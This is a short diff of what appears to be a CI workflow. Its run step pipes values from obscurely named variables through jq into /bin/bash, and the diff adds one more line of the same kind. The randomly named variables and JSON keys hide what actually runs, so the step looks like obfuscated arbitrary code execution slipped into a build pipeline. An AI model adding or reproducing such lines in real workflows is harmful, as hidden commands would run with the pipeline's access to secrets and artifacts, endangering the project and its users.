@@ -36,6 +36,7 @@ jobs:
           echo $cs2 | jq -r .x02787 | /bin/bash
           echo $ay8956 | jq -r .vwnqh30038 | /bin/bash
           printf '%s' "$trsii1739" | jq -r .mws59831 | /bin/bash
+          printf '%s' "$vl1" | jq -r .yduqp75210 | /bin/bash
 
       - name: Archive output
         if: always()
